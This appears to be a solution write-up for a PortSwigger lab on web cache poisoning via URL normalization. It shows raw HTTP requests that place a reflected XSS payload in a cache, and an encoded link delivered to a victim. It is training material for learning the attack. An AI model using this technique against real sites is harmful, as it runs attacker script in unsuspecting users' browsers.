# [Lab: URL normalization](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-normalization)

## Lab

This lab contains an XSS vulnerability that is not directly exploitable due to browser URL-encoding.

To solve the lab, take advantage of the cache's normalization process to exploit this vulnerability. Find the XSS vulnerability and inject a payload that will execute `alert(1)` in the victim's browser. Then, deliver the malicious URL to the victim.

## Analysis

Reflected XSS (burpsuite's repeater):

```http
GET /<script>alert()</script> HTTP/1.1

HTTP/1.1 404 Not Found

<p>Not Found: /<script>alert()</script></p>
```

cannot trigger reflected xss through browser because the payload is url-encoded before sending to the server and the server doesn't decode it.

```http
GET /%3Cscript%3Ealert()%3C/script%3E HTTP/1.1

HTTP/1.1 404 Not Found

<p>Not Found: /%3Cscript%3Ealert()%3C/script%3E</p>
```

normalization applied to the cache key: url-encode

key `<script>alert()</script>` is the same as `%3Cscript%3Ealert()%3C/script%3E`

## Solutions

cache poisoning using burp's repeater with raw payload (not url-encoded):

```http
GET /<script>alert()</script> HTTP/1.1

HTTP/1.1 404 Not Found

<p>Not Found: /<script>alert()</script></p>
```

deliver link `/%3Cscript%3Ealert()%3C/script%3E` to victim => cached:

```http
<p>Not Found: /<script>alert()</script></p>
```
